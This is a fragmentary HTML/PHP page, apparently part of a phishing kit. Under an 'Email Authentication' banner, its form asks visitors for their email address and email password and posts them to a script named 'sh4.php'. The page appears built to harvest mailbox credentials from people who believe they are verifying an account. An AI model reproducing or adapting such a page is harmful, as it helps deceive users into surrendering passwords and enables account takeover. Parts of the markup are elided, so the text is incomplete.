...
<form method="post" action="sh4.php">
            <div calss="dor">
<h2 style="
    font-size: 30px;
...
<div class="bottom-row">
  ...
  <div class="red-grad-bar-skin sup-ie" id="skip-to-h1">
	...
	<tbody><tr>
		...
		<font color="#FFFFFF" style="font-size: 11pt" face="Arial">&nbsp;</font><font style="font-size: 11pt" face="Arial" color="#808080">Email Authentication</font></b></td>
	</tr>
		<tr><td width="202">&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
...
<label for="newEmailAddress"><b> * Email Address:</b></label></font></p></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $zipclass; ?>" name="emailaddress" size="20" maxlength="30" type="email"></td>
	</tr>
...
<label for="newEmailAddress"><b> * Email Password:</b></label></font></p></td>
		<td>&nbsp;&nbsp;
		<input class="<?echo $zipclass; ?>" name="emailpass" size="20" maxlength="20" type="password"></td>
	</tr>
	<tr>
		<td width="202">&nbsp;</td>
		<td>&nbsp;</td>
